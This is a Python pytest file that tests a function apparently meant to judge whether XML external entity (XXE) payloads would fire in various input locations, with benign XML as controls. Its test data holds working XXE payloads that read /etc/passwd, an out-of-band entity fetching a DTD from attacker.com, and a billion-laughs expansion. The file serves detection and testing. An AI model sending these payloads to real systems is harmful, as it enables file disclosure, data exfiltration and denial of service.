import pytest
from xxe_ai.can_fire import can_fire

_CLASSIC = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
_OOB = '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>'
_BILLION = '<!DOCTYPE foo [<!ENTITY billion "&a;&a;"><!ENTITY a "&billion;&billion;">]><foo>&billion;</foo>'

CASES = [
    # Classic external entity — fires
    (_CLASSIC, "xml_body", True),
    # OOB parameter entity — fires
    (_OOB, "xml_body", True),
    # Billion laughs — fires
    (_BILLION, "xml_body", True),
    # SVG with XXE — fires
    ('<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>', "svg_upload", True),
    # SOAP with XXE — fires
    ('<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope>&xxe;</soap:Envelope>', "soap_body", True),
    # Attribute-based XXE — fires
    ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo name="&xxe;"/>', "xml_attribute", True),
    # CDATA-wrapped XXE — fires
    ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>', "xml_cdata", True),
    # Plain valid XML, no entity — does NOT fire
    ("<root><name>test</name></root>", "xml_body", False),
    ("<data>hello</data>", "xml_body", False),
    # Empty / junk — does not fire
    ("", "xml_body", False),
    ("   ", "xml_body", False),
    ("not xml at all", "xml_body", False),
    # Internal entity only (no SYSTEM) — does not fire (not XXE)
    ('<!DOCTYPE foo [<!ENTITY xxe "hello">]><foo>&xxe;</foo>', "xml_body", False),
]


@pytest.mark.parametrize("payload,location,expected", CASES)
def test_can_fire(payload, location, expected):
    assert can_fire(payload, location) is expected
